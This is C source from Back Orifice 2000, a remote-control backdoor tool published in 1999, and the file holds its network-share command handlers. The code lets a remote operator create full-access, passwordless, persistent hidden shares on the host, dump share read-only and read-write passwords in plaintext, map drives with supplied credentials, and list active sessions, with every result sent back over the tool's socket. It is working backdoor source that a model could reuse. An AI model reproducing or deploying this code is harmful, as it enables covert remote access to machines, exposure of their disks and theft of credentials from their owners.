/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<auth.h>
#include<iohandler.h>
#include<functions.h>
#include<osversion.h>
#include<cmd\cmd_msnet.h>
#include<strhandle.h>
#include<permissions.h>
#include<windef.h>
#include<lmcons.h>
#include<lmerr.h>
#include<lmshare.h>
#include<lmaccess.h>

#define	SHI50F_RDONLY		0x0001
#define	SHI50F_FULL			0x0002
#define	SHI50F_DEPENDSON	(SHI50F_RDONLY|SHI50F_FULL)
#define	SHI50F_ACCESSMASK	(SHI50F_RDONLY|SHI50F_FULL)
#define	SHI50F_PERSIST		0x0100
#define SHI50F_SYSTEM		0x0200

#pragma pack(push,1)

struct share_info_50 {
	char		shi50_netname[LM20_NNLEN+1];    /* share name */
	unsigned char 	shi50_type;                 /* see below */
    unsigned short	shi50_flags;                /* see below */
	char FAR *	shi50_remark;                   /* ANSI comment string */
	char FAR *	shi50_path;                     /* shared resource */
	char		shi50_rw_password[SHPWLEN+1];   /* read-write password (share-level security) */
	char		shi50_ro_password[SHPWLEN+1];   /* read-only password (share-level security) */
};	/* share_info_50 */

struct share_info_2 {
    char		shi2_netname[LM20_NNLEN+1];
    char		shi2_pad1;
    unsigned short	shi2_type;
    char FAR *		shi2_remark;
    unsigned short	shi2_permissions;
    unsigned short	shi2_max_uses;
    unsigned short	shi2_current_uses;
    char FAR *		shi2_path;
    char 		shi2_passwd[SHPWLEN+1];
    char		shi2_pad2;
};  /* share_info_2 */

struct session_info_50 {
	char FAR * sesi50_cname;            //remote computer name (connection id in Netware)
	char FAR * sesi50_username;
	unsigned long sesi50_key;           // used to delete session (not used in Netware)
	unsigned short sesi50_num_conns;
	unsigned short sesi50_num_opens;    //not available in Netware
	unsigned long sesi50_time;
	unsigned long sesi50_idle_time;		//not available in Netware
	unsigned char sesi50_protocol;
	unsigned char pad1;
};	/* session_info_50 */

#pragma pack(pop)


void CIOSEnumRes(CAuthSocket *cas_from, int comid, NETRESOURCE *pNetContainer, DWORD dwScope, char *svSpacer)
{
	char svBuffer[2048];

	// Open network resource list
	HANDLE hNet;
	if (pWNetOpenEnum(dwScope,RESOURCETYPE_ANY,0,pNetContainer,&hNet)!=NO_ERROR) return;
	
	// Enumerate resources
	int ret;
	DWORD dwCount,dwBufSize;
	NETRESOURCE *pNetRes;
	pNetRes=(NETRESOURCE *)malloc(16384);
	if(pNetRes==NULL) {
		pWNetCloseEnum(hNet);
		return;
	}
	
	dwCount=1;
	dwBufSize=8192;
	ret=pWNetEnumResource(hNet,&dwCount,pNetRes,&dwBufSize);
	while(ret!=ERROR_NO_MORE_ITEMS) {
		char *svType,*svLocalName,*svRemoteName,*svComment;
		

		char svURLHead[MAX_PATH+1];
		char svURLFoot[MAX_PATH+1];
		svURLHead[0]='\0';
		svURLFoot[0]='\0';

		switch(pNetRes->dwDisplayType) {
		case RESOURCEDISPLAYTYPE_DOMAIN:
			svType="DOMAIN";
			break;
		case RESOURCEDISPLAYTYPE_GENERIC:
			svType="GENERIC";
			break;
		case RESOURCEDISPLAYTYPE_SERVER:
			svType="SERVER";
			break;
		case RESOURCEDISPLAYTYPE_SHARE:			
			switch(pNetRes->dwType) {
			case RESOURCETYPE_DISK:
				svType="FOLDER";
				break;
			case RESOURCETYPE_PRINT:
				svType="PRINTER";
				break;
			default:
				svType="UNKNOWN";
				break;
			}
			break;
		default:
			svType="NETWORK";
			break;
		}
		
		if(pNetRes->lpLocalName==NULL) svLocalName="";
		else svLocalName=pNetRes->lpLocalName;

		if(pNetRes->lpRemoteName==NULL) svRemoteName="";
		else svRemoteName=pNetRes->lpRemoteName;
		
		if(pNetRes->lpComment==NULL) svComment="";
		else svComment=pNetRes->lpComment;
		
		if(!pNetRes->lpLocalName && !pNetRes->lpRemoteName) {
			wsprintf(svBuffer,"%.100s[%s] %.100s\n", svSpacer, svType, svComment);
		} else {
			wsprintf(svBuffer,"%.100s[%s] %.100s (%.100s) \"%.100s\"\n", svSpacer, svType, svRemoteName, svLocalName, svComment);
		}
		IssueAuthCommandReply(cas_from,comid,1,svBuffer);
		
		// Recurse if necessary
		if (pNetRes->dwUsage & RESOURCEUSAGE_CONTAINER && dwScope == RESOURCE_GLOBALNET) {
			char svSpacer2[100];
			lstrcpyn(svSpacer2,svSpacer,100);
			if(lstrlen(svSpacer2)<98) lstrcat(svSpacer2,"  ");
			CIOSEnumRes(cas_from,comid,pNetRes,dwScope,svSpacer2);
		}
		
		dwCount=1;
		dwBufSize=16384;
		ret=pWNetEnumResource(hNet,&dwCount,pNetRes,&dwBufSize);
	}
	free(pNetRes);
	pWNetCloseEnum(hNet);
}

int CmdProc_NetExportAdd(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	DWORD ret;

	CharUpper(svArg2);
	CharUpper(svArg3);

	if(g_bIsWinNT) {
		SHARE_INFO_502 shinfo;
		WCHAR wsvPath[MAX_PATH+1],wsvNetName[256],wsvRemark,wsvPasswd;
		MultiByteToWideChar(CP_ACP,MB_PRECOMPOSED,svArg2,-1,wsvPath,MAX_PATH+1);
		MultiByteToWideChar(CP_ACP,MB_PRECOMPOSED,svArg3,-1,wsvNetName,256);
		wsvRemark=(WCHAR)0;
		wsvPasswd=(WCHAR)0;

		shinfo.shi502_netname=(LPTSTR)wsvNetName;
		shinfo.shi502_type=STYPE_DISKTREE;
		shinfo.shi502_remark=(LPTSTR)&wsvRemark;
		shinfo.shi502_permissions=ACCESS_ALL;
		shinfo.shi502_max_uses=-1;
		shinfo.shi502_current_uses=0;
		shinfo.shi502_path=(LPTSTR)wsvPath;
		shinfo.shi502_passwd=(LPTSTR)&wsvPasswd;
		shinfo.shi502_reserved=0;
		shinfo.shi502_security_descriptor=NULL;
		ret=pLMSNetShareAdd(NULL, 502, (LPBYTE)&shinfo, NULL);	
	
	} else {
		struct share_info_50 shinfo50;

		lstrcpyn(shinfo50.shi50_netname,svArg3,LM20_NNLEN+1);
		shinfo50.shi50_type=STYPE_DISKTREE;
		shinfo50.shi50_flags=SHI50F_FULL | SHI50F_SYSTEM| SHI50F_PERSIST;
		shinfo50.shi50_remark="";
		shinfo50.shi50_path=svArg2;
		shinfo50.shi50_rw_password[0]=0;
		shinfo50.shi50_ro_password[0]=0;
		ret=pSVRNetShareAdd(NULL, 50, (char *)&shinfo50, sizeof(struct share_info_50));
	}

	if(ret==NERR_Success) {
		IssueAuthCommandReply(cas_from,comid,0,"Share added successfully.\n");
	} else {
		IssueAuthCommandReply(cas_from,comid,0,"Error adding share.\n");
	}

	return 0;
}

int CmdProc_NetExportDelete(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	DWORD ret;

	CharUpper(svArg3);

	if(g_bIsWinNT) {
		WCHAR wsvNetName[256];
		MultiByteToWideChar(CP_ACP,MB_PRECOMPOSED,svArg3,-1,wsvNetName,256);
		ret=pLMSNetShareDel(NULL,wsvNetName,0);
	} else {
		ret=pSVRNetShareDel(NULL,svArg3,0);
	}

	if(ret==NERR_Success) {
		IssueAuthCommandReply(cas_from,comid,0,"Share removed successfully.\n");
	} else {
		IssueAuthCommandReply(cas_from,comid,0,"Error removing share.\n");
	}

	return 0;
}

int CmdProc_NetExportList(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	DWORD i;

	if(g_bIsWinNT) {
		SHARE_INFO_502 *pshinfo;
		DWORD dwCount,dwTotal;

		pLMSNetShareEnum(NULL,502,(LPBYTE *)&pshinfo,-1,&dwCount,&dwTotal,NULL);
		for(i=0;i<dwCount;i++) {
			char svBuffer[1024];
			char *svType;
			
			switch(pshinfo->shi502_type) {
			case STYPE_DISKTREE:
				svType="Disk";
				break;
			case STYPE_PRINTQ:
				svType="Printer";
				break;
			case STYPE_DEVICE:
				svType="Device";
				break;
			case STYPE_IPC:
				svType="IPC";
				break;
			default:
				svType="Unknown";
			}

			wsprintf(svBuffer,"%.100ls [%.100s] (%.260ls) '%.100ls'\n",pshinfo->shi502_netname,svType,pshinfo->shi502_path,
				pshinfo->shi502_remark);
			IssueAuthCommandReply(cas_from,comid,1,svBuffer);
			if(pshinfo->shi502_security_descriptor) {
				IssueSecurityDescriptor(cas_from,comid,pshinfo->shi502_security_descriptor);
			}

			pshinfo++;	
		}

//		pLMSNetApiBufferFree(pshinfo);
		
	} else {
		struct share_info_50 *pshinfo;
		WORD dwCount,dwTotal;

		pshinfo=(struct share_info_50 *)malloc(16384);
		if(pshinfo==NULL) {
			IssueAuthCommandReply(cas_from,comid,0,"Error enumerating shares.\n");
			return -1;
		}
		pSVRNetShareEnum(NULL,(WORD)50,(char *)pshinfo,(WORD)16384,&dwCount,&dwTotal);
		for(i=0;i<dwCount;i++) {
			char svBuffer[1024];
			char *svType;
			
			switch(pshinfo->shi50_type) {
			case STYPE_DISKTREE:
				svType="Disk";
				break;
			case STYPE_PRINTQ:
				svType="Printer";
				break;
			case STYPE_DEVICE:
				svType="Device";
				break;
			case STYPE_IPC:
				svType="IPC";
				break;
			default:
				svType="Unknown";
			}

			wsprintf(svBuffer,"%.100s [%.100s] (%.260s) \"%.100s\"  RO passwd:%.100s  RW passwd:%.100s  %s%s%s%s\n",
							  pshinfo->shi50_netname,
							  svType,
							  pshinfo->shi50_path,
							  pshinfo->shi50_remark?pshinfo->shi50_remark:"",
							  pshinfo->shi50_ro_password?(pshinfo->shi50_ro_password[0]!='\0'?pshinfo->shi50_ro_password:"(none)"):"(none)",
							  pshinfo->shi50_rw_password?(pshinfo->shi50_rw_password[0]!='\0'?pshinfo->shi50_rw_password:"(none)"):"(none)",
							  (pshinfo->shi50_flags & SHI50F_PERSIST)?"PERSISTANT ":"",
							  (pshinfo->shi50_flags & SHI50F_SYSTEM)?"SYSTEM ":"",
							  (pshinfo->shi50_flags & SHI50F_RDONLY)?"READONLY ":"",
							  (pshinfo->shi50_flags & SHI50F_FULL)?"FULL":"");

			IssueAuthCommandReply(cas_from,comid,1,svBuffer);
			
			pshinfo++;	
		}
		free(pshinfo);									
	}
	return 0;
}

int CmdProc_NetView(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	CIOSEnumRes(cas_from, comid, NULL, RESOURCE_GLOBALNET, "");
	return 0;
}

int CmdProc_NetUse(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];
	NETRESOURCE nr;

	char *svLocalName, *svRemotePath, *svUsername, *svPassword;
	svLocalName=svArg2;
	svRemotePath=BreakString(svLocalName,",");
	while((*svRemotePath)==' ') svRemotePath++;
	svUsername=svArg3;
	svPassword=BreakString(svUsername,":");
	
	CharUpper(svLocalName);
	if(strncmp(svLocalName,"LPT",3)==0) nr.dwType=RESOURCETYPE_PRINT;
	else nr.dwType=RESOURCETYPE_DISK;
	if(svLocalName[0]=='\0') nr.lpLocalName=NULL;
	else nr.lpLocalName=svLocalName;
	nr.lpRemoteName=svRemotePath;
	nr.lpProvider=NULL;

	if(svPassword) if(svPassword[0]=='\0') svPassword=NULL;
	if(svUsername) if(svUsername[0]=='\0') svUsername=NULL;

	if(pWNetAddConnection2(&nr, svPassword, svUsername, CONNECT_UPDATE_PROFILE) != NO_ERROR) {
		wsprintf(svBuffer,"Error mapping shared device.\n");
		IssueAuthCommandReply(cas_from,comid,0,svBuffer);
	} else {
		wsprintf(svBuffer,"Shared device mapped successfully.\n");
		IssueAuthCommandReply(cas_from,comid,0,svBuffer);
	}
	
	return 0;
}

int CmdProc_NetDelete(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];
	
	if(pWNetCancelConnection2(svArg2,CONNECT_UPDATE_PROFILE,TRUE) != NO_ERROR) {
		wsprintf(svBuffer,"Error unmapping shared device.\n");
		IssueAuthCommandReply(cas_from,comid,0,svBuffer);
	} else {
		wsprintf(svBuffer,"Shared device unmapped successfully.\n");
		IssueAuthCommandReply(cas_from,comid,0,svBuffer);
	}

	return 0;
}

int CmdProc_NetConnections(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];
	
	wsprintf(svBuffer,"Current connections:\n");
	IssueAuthCommandReply(cas_from,comid,1,svBuffer);
	CIOSEnumRes(cas_from, comid, NULL, RESOURCE_CONNECTED, "  ");
	
	wsprintf(svBuffer,"Persistent connections:\n");
	IssueAuthCommandReply(cas_from,comid,1,svBuffer);
	CIOSEnumRes(cas_from, comid, NULL, RESOURCE_REMEMBERED, "  ");
	
	wsprintf(svBuffer,"Incoming connections:\n");
	IssueAuthCommandReply(cas_from,comid,1,svBuffer);

	if(g_bIsWinNT) {
		SESSION_INFO_502 *psinfo;
		DWORD dwCount, dwTotal, i;

		pLMSNetSessionEnum(NULL,NULL,NULL,502,(LPBYTE *)&psinfo,65536,&dwCount,&dwTotal,NULL);

		for(i=0;i<dwCount;i++) {
			wsprintf(svBuffer, "Computer: %.100ls User: %.100ls Opens: %d Time: %ds Idle: %ds Transport: %.100ls %s%s\n", 
				psinfo->sesi502_cname, 
				psinfo->sesi502_username, 
				(int)psinfo->sesi502_num_opens, 
				(int)psinfo->sesi502_time, 
				(int)psinfo->sesi502_idle_time,
				psinfo->sesi502_transport,
				(psinfo->sesi502_user_flags & SESS_GUEST)?"(GUEST)":"",
				(psinfo->sesi502_user_flags & SESS_NOENCRYPTION)?"(NO ENCRYPTION)":"");
			
			IssueAuthCommandReply(cas_from,comid,1,svBuffer);

			psinfo++;
		}

//		pLMSNetApiBufferFree(psinfo);

	} else {
		struct session_info_50 *psinfo;
		WORD wCount, wTotal, i;

		psinfo=(struct session_info_50 *) malloc(16384);
		if(psinfo==NULL) {
			IssueAuthCommandReply(cas_from,comid,1,"Error allocating memory.\n");
			return -1;
		}

		if(pSVRNetSessionEnum(NULL, 50, (char *)psinfo, 16384, &wCount, &wTotal)==0) {			
			for(i=0;i<wCount;i++) {
				wsprintf(svBuffer, "Computer: '%s' User: '%s' Connects: %d Opens: %d Time: %d Idle: %d Prot: %d\n", 
					psinfo->sesi50_cname, psinfo->sesi50_username, (int)psinfo->sesi50_num_conns, 
					(int)psinfo->sesi50_num_opens, (int)psinfo->sesi50_time, (int)psinfo->sesi50_idle_time,
					(int)psinfo->sesi50_protocol);
			
				IssueAuthCommandReply(cas_from,comid,1,svBuffer);
				psinfo++;
			}
		} else {
			IssueAuthCommandReply(cas_from,comid,1,"Error enumerating connections.\n");
			free(psinfo);
			return -1;
		}

		free(psinfo);
	}

	return 0;
}

